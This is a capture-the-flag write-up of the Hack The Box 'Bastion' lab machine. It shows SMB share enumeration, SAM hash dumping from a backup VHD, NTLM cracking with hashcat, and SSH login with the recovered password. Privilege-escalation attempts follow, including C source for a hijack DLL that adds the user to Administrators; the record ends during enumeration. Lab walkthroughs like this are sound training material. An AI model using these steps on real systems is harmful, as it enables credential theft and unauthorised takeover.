# Bastion

URL: https://app.hackthebox.com/machines/Bastion

Level: Easy

Date 13 May 2021

## Walkthrough

- [Enumeration](#enumeration)
- [User flag](#user-flag)
- [Privesc](#privesc)

# Enumeration

## NMAP

```
# Nmap 7.91 scan initiated Tue May 11 14:47:38 2021 as: nmap -T4 -p- -oN 01_nmap.txt 10.10.10.134
Nmap scan report for 10.10.10.134
Host is up (0.047s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

# Nmap done at Tue May 11 14:48:25 2021 -- 1 IP address (1 host up) scanned in 47.13 seconds
```

```
# Nmap 7.91 scan initiated Tue May 11 14:56:22 2021 as: nmap -T4 -A -p22,135,139,445,5985,47001,49664-49670 -oN 02_nmap.txt 10.10.10.134
Nmap scan report for 10.10.10.134
Host is up (0.056s latency).

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -39m58s, deviation: 1h09m14s, median: 0s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-11T14:57:48+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-05-11T12:57:45
|_  start_date: 2021-05-11T12:47:15

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   44.01 ms 10.10.14.1
2   48.66 ms 10.10.10.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May 11 14:57:53 2021 -- 1 IP address (1 host up) scanned in 91.28 seconds
```

We focus on samba service, and we found some share:

```
root@kali:/opt/htb/Bastion# smbclient \\\\10.10.10.134\\Backups
Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 16 12:02:11 2019
  ..                                  D        0  Tue Apr 16 12:02:11 2019
  note.txt                           AR      116  Tue Apr 16 12:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 13:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 13:44:02 2019

                7735807 blocks of size 4096. 2747704 blocks available
smb: \>
```

We grab `note.txt` and we found a simple hint:

```	
root@kali:/opt/htb/Bastion# cat note.txt

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

So probably we don't need to transfer entire L4mpje-PC image backup:

```
smb: \WindowsImageBackup\> dir
  .                                  Dn        0  Fri Feb 22 13:44:02 2019
  ..                                 Dn        0  Fri Feb 22 13:44:02 2019
  L4mpje-PC                          Dn        0  Fri Feb 22 13:45:32 2019

                7735807 blocks of size 4096. 2747596 blocks available
```

We install `libguestfs-tools`:

```
apt-get install libguestfs-tools
```

and we mount vhd file on our system on `/mnt/vhd`:

```
root@kali:/mnt# guestmount --add /mnt/smb/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --ro /mnt/vhd2/ -m /dev/sda1
root@kali:/mnt# ls vhd2/
'$Recycle.Bin'   autoexec.bat   config.sys  'Documents and Settings'   pagefile.sys   PerfLogs   ProgramData  'Program Files'   Recovery  'System Volume Information'   Users   Windows
```	

Since we have full filesystem access, we grab `SYSTEM` and `SAM` files; then we use `samdump2`:

```
root@kali:/mnt/vhd2/Windows/System32/config# samdump2 SYSTEM SAM
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```

With hashcat we are able to decrypt L4mpje's password:

```
root@kali:/opt/htb/Bastion# hashcat -m 1000 localhash /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-5200U CPU @ 2.20GHz, 2889/2953 MB (1024 MB allocatable), 1MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

26112010952d963c8dc4217daec986d9:bureaulampje

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: 26112010952d963c8dc4217daec986d9
Time.Started.....: Wed May 12 09:28:32 2021 (4 secs)
Time.Estimated...: Wed May 12 09:28:36 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2817.0 kH/s (0.17ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 9396224/14344385 (65.50%)
Rejected.........: 0/9396224 (0.00%)
Restore.Point....: 9395200/14344385 (65.50%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: burgers11 -> burbank105

Started: Wed May 12 09:28:06 2021
Stopped: Wed May 12 09:28:37 2021
```

Now we can access through SSH:

```
root@kali:/opt/htb/Bastion# ssh L4mpje@10.10.10.134
The authenticity of host '10.10.10.134 (10.10.10.134)' can't be established.
ECDSA key fingerprint is SHA256:ILc1g9UC/7j/5b+vXeQ7TIaXLFddAbttU86ZeiM/bNY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.134' (ECDSA) to the list of known hosts.
L4mpje@10.10.10.134's password:
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

l4mpje@BASTION C:\Users\L4mpje>
```	

We check our privileges:

```
l4mpje@BASTION C:\Users\L4mpje\Desktop>whoami
bastion\l4mpje

l4mpje@BASTION C:\Users\L4mpje\Desktop>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

l4mpje@BASTION C:\Users\L4mpje\Desktop>
```

# User-flag

We grab user flag:

```
l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt
9bfe57d5c3309db3a151772f9d86c6cd
l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt
9bfe57d5c3309db3a151772f9d86c6cd
```

# Privesc

We spend lots of time with several paths:

## Sherlock

```
root@kali:/opt/htb/Bastion# scp Sherlock.ps1 l4mpje@10.10.10.134:
l4mpje@10.10.10.134's password:
Sherlock.ps1


l4mpje@BASTION c:\Users\L4mpje>powershell.exe -ExecutionPolicy Bypass -command "& {Import-Module .\sherlock.ps1; Find-AllVulns}"

Get-WmiObject : Access denied
At C:\Users\L4mpje\sherlock.ps1:50 char:25
+     $CPUArchitecture = (Get-WmiObject Win32_OperatingSystem).OSArchit ...
+                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

Get-WmiObject : Access denied
At C:\Users\L4mpje\sherlock.ps1:50 char:25
+     $CPUArchitecture = (Get-WmiObject Win32_OperatingSystem).OSArchit ...
+                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

Get-WmiObject : Access denied
At C:\Users\L4mpje\sherlock.ps1:50 char:25
+     $CPUArchitecture = (Get-WmiObject Win32_OperatingSystem).OSArchit ...
+                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

Get-WmiObject : Access denied
At C:\Users\L4mpje\sherlock.ps1:50 char:25
+     $CPUArchitecture = (Get-WmiObject Win32_OperatingSystem).OSArchit ...
+                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

Get-WmiObject : Access denied
At C:\Users\L4mpje\sherlock.ps1:50 char:25
+     $CPUArchitecture = (Get-WmiObject Win32_OperatingSystem).OSArchit ...
+                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

Get-WmiObject : Access denied
At C:\Users\L4mpje\sherlock.ps1:50 char:25
+     $CPUArchitecture = (Get-WmiObject Win32_OperatingSystem).OSArchit ...
+                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

Get-WmiObject : Access denied
At C:\Users\L4mpje\sherlock.ps1:50 char:25
+     $CPUArchitecture = (Get-WmiObject Win32_OperatingSystem).OSArchit ...
+                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

Get-Item : Cannot find path 'C:\Windows\system32\drivers\mrxdav.sys' because it does not exist.
At C:\Users\L4mpje\sherlock.ps1:31 char:21
+     $VersionInfo = (Get-Item $FilePath).VersionInfo
+                     ~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Windows\system32\drivers\mrxdav.sys:String) [Get-Item], ItemNotFoundExceptio
   n
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand

Get-WmiObject : Access denied
At C:\Users\L4mpje\sherlock.ps1:61 char:19
+     $CoreCount = (Get-WmiObject Win32_Processor).NumberOfLogicalProce ...
+                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

Get-WmiObject : Access denied
At C:\Users\L4mpje\sherlock.ps1:50 char:25
+     $CPUArchitecture = (Get-WmiObject Win32_OperatingSystem).OSArchit ...
+                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

Get-WmiObject : Access denied
At C:\Users\L4mpje\sherlock.ps1:50 char:25
+     $CPUArchitecture = (Get-WmiObject Win32_OperatingSystem).OSArchit ...
+                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

Get-WmiObject : Access denied
At C:\Users\L4mpje\sherlock.ps1:50 char:25
+     $CPUArchitecture = (Get-WmiObject Win32_OperatingSystem).OSArchit ...
+                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

Get-WmiObject : Access denied
At C:\Users\L4mpje\sherlock.ps1:40 char:24
+     $SoftwareVersion = Get-WmiObject -Class Win32_Product | Where-Obj ...
+                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand



Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not Vulnerable

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not Vulnerable

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not Vulnerable

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not Vulnerable

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Not Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
VulnStatus : Not Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Not Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable
```

## PowerUp

```
l4mpje@BASTION c:\Users\L4mpje>powershell -ep bypass
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users\L4mpje> . .\PowerUp.ps1


PS C:\Users\L4mpje> Get-ProcessTokenGroup

SID                                                                                                                  Attributes
---                                                                                                                  ----------
S-1-5-21-2146344083-2443430429-1430880910-513                 SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
S-1-1-0                                                       SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
S-1-5-32-545                                                  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
S-1-5-2                                                       SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
S-1-5-11                                                      SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
S-1-5-15                                                      SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
S-1-5-113                                                     SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
S-1-5-5-0-203329                              ...ORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_INTEGRITY_ENABLED
S-1-5-64-10                                                   SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED


PS C:\Users\L4mpje> Get-ProcessTokenPrivilege

Privilege                                                                Attributes TokenHandle ProcessId
---------                                                                ---------- ----------- ---------
SeChangeNotifyPrivilege       SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED        2620      2912
SeIncreaseWorkingSetPrivilege SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED        2620      2912


PS C:\Users\L4mpje> Get-UnquotedService
Get-WmiObject : Access denied
At C:\Users\L4mpje\PowerUp.ps1:2066 char:21
+     $VulnServices = Get-WmiObject -Class win32_service | Where-Object ...
+                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand





PS C:\Users\L4mpje> Get-RegistryAlwaysInstallElevated
False

PS C:\Users\L4mpje> Find-PathDLLHijack
Test-Path : Access is denied
At C:\Users\L4mpje\PowerUp.ps1:857 char:43
+ ...                 if ($ParentPath -and (Test-Path -Path $ParentPath)) {
+                                           ~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Windows\syst...Local\Microsoft:String) [Test-Path], UnauthorizedAccessExce
   ption
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.TestPathCommand



ModifiablePath    : C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps
IdentityReference : BASTION\L4mpje
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'






ModifiablePath    : C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps
IdentityReference : BASTION\L4mpje
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps
```

## IKEEXT

```
wget https://raw.githubusercontent.com/securycore/Ikeext-Privesc/master/Ikeext-Privesc.ps1


root@kali:/opt/htb/Bastion# scp Ikeext-Privesc.ps1  l4mpje@10.10.10.134:
l4mpje@10.10.10.134's password:
Ikeext-Privesc.ps1

PS C:\Users\L4mpje> . .\Ikeext-Privesc.ps1
PS C:\Users\L4mpje> Invoke-IkeextCheck -Verbose
+----------------------------------------------------------+
|                IKEEXT DLL Hijacking Check                |
+----------------------------------------------------------+
[*] Checking system version
Get-WmiObject : Access denied
At C:\Users\L4mpje\Ikeext-Privesc.ps1:195 char:22
+     $os_wmi_object = Get-WmiObject -Class Win32_OperatingSystem
+                      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

[*] |__ OS Version:
[*] |__ OS Name:
[*] |__ OS Architecture:
[-]  is not vulnerable.

[*] Checking IKEEXT service status and start mode
Get-Service : Cannot find any service with service name 'IKEEXT'.
At C:\Users\L4mpje\Ikeext-Privesc.ps1:223 char:16
+     $service = Get-Service -Name "IKEEXT"
+                ~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (IKEEXT:String) [Get-Service], ServiceCommandException
    + FullyQualifiedErrorId : NoServiceFoundForGivenName,Microsoft.PowerShell.Commands.GetServiceCommand

[*] |__ Service status: Not running
Get-WmiObject : Access denied
At C:\Users\L4mpje\Ikeext-Privesc.ps1:234 char:20
+ ... art_mode = (Get-WmiObject -Query "Select StartMode From Win32_Service ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

[-] |__ Service start mode: Disabled
[-] IKEEXT is not disabled.

[*] Searching for PATH folders with weak permissions
[-] |__ Access denied: 'C:\Windows\system32'
[-] |__ Access denied: 'C:\Windows'
[-] |__ Access denied: 'C:\Windows\System32\Wbem'
[-] |__ Access denied: 'C:\Windows\System32\WindowsPowerShell\v1.0\'
[-] |__ Access denied: 'C:\Program Files\OpenSSH-Win64'
[-] Found 0 PATH folder(s) with weak permissions.

[*] Searching for 'wlbsctrl.dll' on the system
[+] 'wlbsctrl.dll' was not found on the system. <=============================================================
```

We can try DLL Hijacking strategy:

https://itm4n.github.io/windows-dll-hijacking-clarified/

```
root@kali:/opt/htb/Bastion# cp -a windows_dll.c.orig wlbsctrl.c
root@kali:/opt/htb/Bastion# vi wlbsctrl.c
root@kali:/opt/htb/Bastion# cat wlbsctrl.c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrators L4mpje /add");
        ExitProcess(0);
    }
    return TRUE;
}



root@kali:/opt/htb/Bastion# x86_64-w64-mingw32-gcc wlbsctrl.c -shared -o wlbsctrl.dll
```

## WindowsEnum.ps1


```
l4mpje@BASTION C:\Users\L4mpje>powershell -nologo -executionpolicy bypass -file WindowsEnum.ps1 extended
```

## OpenSSH

```
Match Group administrators
       AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys

l4mpje@BASTION c:\Program Files\OpenSSH-Win64>
```

## JAWS

```
PS C:\Users\L4mpje> . .\jaws-enum.ps1

Running J.A.W.S. Enumeration
Get-WmiObject : Access denied
At C:\Users\L4mpje\jaws-enum.ps1:31 char:21
+     $win_version = (Get-WmiObject -class Win32_OperatingSystem)
+                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

        - Gathering User Information
        - Gathering Processes, Services and Scheduled Tasks
Get-WmiObject : Access denied
At C:\Users\L4mpje\jaws-enum.ps1:105 char:28
+     $output = $output +  ((Get-WmiObject win32_process | Select-Objec ...
+                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

get-service : Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
At C:\Users\L4mpje\jaws-enum.ps1:115 char:26
+     $output = $output + (get-service | Select Name,DisplayName,Status ...
+                          ~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperationException
    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetServiceCommand

        - Gathering Installed Software
get-wmiobject : Access denied
At C:\Users\L4mpje\jaws-enum.ps1:122 char:27
+     $output = $output +  (get-wmiobject -Class win32_product | select ...
+                           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

Get-Wmiobject : Access denied
At C:\Users\L4mpje\jaws-enum.ps1:127 char:27
+ ... $output +  (Get-Wmiobject -class Win32_QuickFixEngineering -namespace ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

        - Gathering File System Information
Get-WmiObject : Access denied
At C:\Users\L4mpje\jaws-enum.ps1:173 char:27
+ ...  $output = $output +  (Get-WmiObject -Class Win32_LogicalDisk | selec ...
+                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

ERROR:
Description = Access denied
        - Looking for Simple Priv Esc Methods
############################################################
##     J.A.W.S. (Just Another Windows Enum Script)        ##
##                                                        ##
##           https://github.com/411Hall/JAWS              ##
##                                                        ##
############################################################

Windows Version:
Architecture: AMD64
Hostname: BASTION
Current User: l4mpje
Current Time\Date: 05/13/2021 23:35:52

-----------------------------------------------------------
 Users
-----------------------------------------------------------
----------
Username: Administrator
Groups:   Administrators
----------
Username: DefaultAccount
Groups:   System Managed Accounts Group
----------
Username: Guest
Groups:   Guests
----------
Username: L4mpje
Groups:   Users

-----------------------------------------------------------
 Network Information
-----------------------------------------------------------

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::d4c7:fe14:8e06:934b
   Link-local IPv6 Address . . . . . : fe80::d4c7:fe14:8e06:934b%4
   IPv4 Address. . . . . . . . . . . : 10.10.10.134
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:3590%4
                                       10.10.10.2

Tunnel adapter isatap.{8253841C-588D-4E94-B23A-993BB2E4B4D9}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :

-----------------------------------------------------------
 Arp
-----------------------------------------------------------

Interface: 10.10.10.134 --- 0x4
  Internet Address      Physical Address      Type
  10.10.10.2            00-50-56-b9-35-90     dynamic
  10.10.10.255          ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.252           01-00-5e-00-00-fc     static
